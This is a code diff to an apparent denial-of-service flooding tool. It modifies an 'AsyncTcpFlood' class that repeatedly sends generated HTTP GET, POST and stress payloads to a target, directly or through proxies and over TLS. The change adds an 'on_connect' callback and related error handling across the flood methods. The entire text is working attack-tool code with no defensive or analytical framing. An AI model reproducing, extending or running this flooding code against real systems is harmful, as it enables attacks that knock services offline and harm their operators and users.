@@ -663,10 +663,10 @@ class AsyncTcpFlood(HttpFlood):
         self._loop = loop
         self._settings = settings or AttackSettings()
 
-    async def run(self) -> bool:
+    async def run(self, on_connect=None) -> bool:
         assert self._loop is not None, "Event loop has to be set to run async flooder"
         try:
-            return await self.SENT_FLOOD()
+            return await self.SENT_FLOOD(on_connect=on_connect)
         except OSError as exc:
             if exc.errno == errno.ENOBUFS:
                 await asyncio.sleep(0.1)
@@ -772,7 +772,7 @@ class AsyncTcpFlood(HttpFlood):
         return packets_sent > 0
     
     # XXX: get rid of RPC param when OVH is gone
-    async def _generic_flood_proto(self, payload, *, rpc: Optional[int] = None) -> bool:
+    async def _generic_flood_proto(self, payload, *, on_connect = None, rpc: Optional[int] = None) -> bool:
         on_close = self._loop.create_future()
         rpc = rpc or self._settings.requests_per_connection
         flood_proto = partial(
@@ -782,6 +782,7 @@ class AsyncTcpFlood(HttpFlood):
             self._stats,
             self._settings,
             FloodSpec.from_any(payload, rpc),
+            on_connect=on_connect,
         )
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         server_hostname = "" if is_tls else None
@@ -805,6 +806,7 @@ class AsyncTcpFlood(HttpFlood):
                 ssl_ctx,
                 downstream_factory=flood_proto,
                 connect_timeout=self._settings.dest_connect_timeout_seconds,
+                on_connect=on_connect,
             )
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
@@ -812,23 +814,29 @@ class AsyncTcpFlood(HttpFlood):
             async with timeout(self._settings.connect_timeout_seconds):
                 await conn
         except asyncio.CancelledError as e:
+            if on_connect:
+                on_connect.cancel()
             on_close.cancel()
+            raise e
+        except Exception as e:
+            if on_connect:
+                on_connect.set_exception(e)
             raise e
         else:
             return bool(await on_close)
 
     # XXX: again, with functions it's just a partial
-    async def GET(self) -> bool:
+    async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload()
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
-    async def POST(self) -> bool:
+    async def POST(self, on_connect=None) -> bool:
         payload: bytes = self.generate_payload(
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
-        return await self._generic_flood(payload)
+        return await self._generic_flood_proto(payload, on_connect=on_connect)
 
     async def STRESS(self) -> bool:
         payload: bytes = self.generate_payload(
